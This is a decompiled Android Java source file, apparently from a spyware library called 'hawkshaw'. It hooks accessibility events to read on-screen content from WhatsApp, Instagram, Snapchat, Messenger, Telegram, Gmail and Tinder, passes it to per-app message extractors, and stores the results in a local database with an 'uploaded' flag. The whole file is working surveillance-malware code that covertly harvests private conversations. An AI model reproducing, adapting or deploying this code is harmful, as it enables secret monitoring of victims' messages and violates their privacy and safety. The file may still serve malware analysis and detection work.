package com.hawkshaw.library.features.accessibility.socialmedia;

import M1.c;
import W2.e;
import W2.l;
import Y1.K;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import androidx.core.app.NotificationCompat;
import com.hawkshaw.library.datalayer.models.PackageName;
import com.hawkshaw.library.datalayer.room.AppDatabaseKt;
import com.hawkshaw.library.datalayer.room.socialmedia.SocialMediaEntity;
import com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaDao;
import com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaEntity;
import java.util.concurrent.ExecutorService;

public final class HandlerKt {
    private static final e executor$delegate = new l(c.f1297D);

    public /* synthetic */ class WhenMappings {
        public static final /* synthetic */ int[] $EnumSwitchMapping$0;

        /* JADX WARNING: Can't wrap try/catch for region: R(22:0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|(2:19|20)|21|23) */
        /* JADX WARNING: Can't wrap try/catch for region: R(23:0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|19|20|21|23) */
        /* JADX WARNING: Failed to process nested try/catch */
        /* JADX WARNING: Missing exception handler attribute for start block: B:11:0x0034 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:13:0x003d */
        /* JADX WARNING: Missing exception handler attribute for start block: B:15:0x0046 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:17:0x0050 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:19:0x005a */
        /* JADX WARNING: Missing exception handler attribute for start block: B:3:0x0010 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:5:0x0019 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:7:0x0022 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:9:0x002b */
        static {
            /*
                com.hawkshaw.library.datalayer.models.PackageName[] r0 = com.hawkshaw.library.datalayer.models.PackageName.values()
                int r0 = r0.length
                int[] r0 = new int[r0]
                com.hawkshaw.library.datalayer.models.PackageName r1 = com.hawkshaw.library.datalayer.models.PackageName.WHATSAPP     // Catch:{ NoSuchFieldError -> 0x0010 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0010 }
                r2 = 1
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0010 }
            L_0x0010:
                com.hawkshaw.library.datalayer.models.PackageName r1 = com.hawkshaw.library.datalayer.models.PackageName.GB_WHATSAPP     // Catch:{ NoSuchFieldError -> 0x0019 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0019 }
                r2 = 2
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0019 }
            L_0x0019:
                com.hawkshaw.library.datalayer.models.PackageName r1 = com.hawkshaw.library.datalayer.models.PackageName.WHATSAPP_BUSINESS     // Catch:{ NoSuchFieldError -> 0x0022 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0022 }
                r2 = 3
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0022 }
            L_0x0022:
                com.hawkshaw.library.datalayer.models.PackageName r1 = com.hawkshaw.library.datalayer.models.PackageName.INSTAGRAM     // Catch:{ NoSuchFieldError -> 0x002b }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x002b }
                r2 = 4
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x002b }
            L_0x002b:
                com.hawkshaw.library.datalayer.models.PackageName r1 = com.hawkshaw.library.datalayer.models.PackageName.SNAPCHAT     // Catch:{ NoSuchFieldError -> 0x0034 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0034 }
                r2 = 5
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0034 }
            L_0x0034:
                com.hawkshaw.library.datalayer.models.PackageName r1 = com.hawkshaw.library.datalayer.models.PackageName.FACEBOOK_MESSENGER     // Catch:{ NoSuchFieldError -> 0x003d }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x003d }
                r2 = 6
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x003d }
            L_0x003d:
                com.hawkshaw.library.datalayer.models.PackageName r1 = com.hawkshaw.library.datalayer.models.PackageName.TELEGRAM     // Catch:{ NoSuchFieldError -> 0x0046 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0046 }
                r2 = 7
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0046 }
            L_0x0046:
                com.hawkshaw.library.datalayer.models.PackageName r1 = com.hawkshaw.library.datalayer.models.PackageName.TELEGRAM_WEB     // Catch:{ NoSuchFieldError -> 0x0050 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0050 }
                r2 = 8
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0050 }
            L_0x0050:
                com.hawkshaw.library.datalayer.models.PackageName r1 = com.hawkshaw.library.datalayer.models.PackageName.GMAIL     // Catch:{ NoSuchFieldError -> 0x005a }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x005a }
                r2 = 9
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x005a }
            L_0x005a:
                com.hawkshaw.library.datalayer.models.PackageName r1 = com.hawkshaw.library.datalayer.models.PackageName.TINDER     // Catch:{ NoSuchFieldError -> 0x0064 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0064 }
                r2 = 10
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0064 }
            L_0x0064:
                $EnumSwitchMapping$0 = r0
                return
            */
            throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.accessibility.socialmedia.HandlerKt.WhenMappings.<clinit>():void");
        }
    }

    public static final void extractSocialMedia(AccessibilityEvent accessibilityEvent) {
        K.n(accessibilityEvent, NotificationCompat.CATEGORY_EVENT);
        Researcher researcher = Researcher.INSTANCE;
        researcher.print(" \n \n \n");
        CharSequence packageName = accessibilityEvent.getPackageName();
        CharSequence className = accessibilityEvent.getClassName();
        CharSequence contentDescription = accessibilityEvent.getContentDescription();
        researcher.print(packageName + ", " + className + ", " + contentDescription);
        AccessibilityNodeInfo source = accessibilityEvent.getSource();
        if (source != null) {
            PackageName from = PackageName.Companion.from(accessibilityEvent.getPackageName());
            switch (from == null ? -1 : WhenMappings.$EnumSwitchMapping$0[from.ordinal()]) {
                case 1:
                case 2:
                    Whatsapp whatsapp = Whatsapp.INSTANCE;
                    ExecutorService executor = getExecutor();
                    K.m(executor, "<get-executor>(...)");
                    whatsapp.extractMessages(source, executor);
                    return;
                case 3:
                    WhatsappBusiness whatsappBusiness = WhatsappBusiness.INSTANCE;
                    ExecutorService executor2 = getExecutor();
                    K.m(executor2, "<get-executor>(...)");
                    whatsappBusiness.extractMessages(source, executor2);
                    return;
                case 4:
                    Instagram instagram = Instagram.INSTANCE;
                    ExecutorService executor3 = getExecutor();
                    K.m(executor3, "<get-executor>(...)");
                    instagram.extractMessages(source, executor3);
                    return;
                case 5:
                    Snapchat snapchat = Snapchat.INSTANCE;
                    ExecutorService executor4 = getExecutor();
                    K.m(executor4, "<get-executor>(...)");
                    snapchat.extractMessages(source, executor4);
                    return;
                case 6:
                    FacebookMessenger facebookMessenger = FacebookMessenger.INSTANCE;
                    ExecutorService executor5 = getExecutor();
                    K.m(executor5, "<get-executor>(...)");
                    facebookMessenger.extractMessages(accessibilityEvent, executor5);
                    return;
                case 7:
                case 8:
                    Telegram telegram = Telegram.INSTANCE;
                    ExecutorService executor6 = getExecutor();
                    K.m(executor6, "<get-executor>(...)");
                    telegram.extractMessages(source, executor6);
                    return;
                case 9:
                    Gmail gmail = Gmail.INSTANCE;
                    ExecutorService executor7 = getExecutor();
                    K.m(executor7, "<get-executor>(...)");
                    gmail.extractMessages(source, executor7);
                    return;
                case 10:
                    Tinder tinder = Tinder.INSTANCE;
                    ExecutorService executor8 = getExecutor();
                    K.m(executor8, "<get-executor>(...)");
                    tinder.extractMessages(accessibilityEvent, executor8);
                    return;
                default:
                    return;
            }
        }
    }

    private static final ExecutorService getExecutor() {
        return (ExecutorService) executor$delegate.getValue();
    }

    public static final void insert(UnprocessedSocialMediaEntity unprocessedSocialMediaEntity) {
        K.n(unprocessedSocialMediaEntity, "<this>");
        UnprocessedSocialMediaDao unprocessedSocialMediaDao = AppDatabaseKt.getDb().unprocessedSocialMediaDao();
        UnprocessedSocialMediaEntity sync = unprocessedSocialMediaDao.getSync(unprocessedSocialMediaEntity.getId());
        UnprocessedSocialMediaEntity[] unprocessedSocialMediaEntityArr = new UnprocessedSocialMediaEntity[1];
        if (sync != null) {
            unprocessedSocialMediaEntity = UnprocessedSocialMediaEntity.copy$default(unprocessedSocialMediaEntity, 0, (String) null, (String) null, (String) null, (String) null, (SocialMediaEntity.Type) null, (PackageName) null, (String) null, sync.getUploaded(), 255, (Object) null);
        }
        unprocessedSocialMediaEntityArr[0] = unprocessedSocialMediaEntity;
        unprocessedSocialMediaDao.insertSync(unprocessedSocialMediaEntityArr);
    }
}
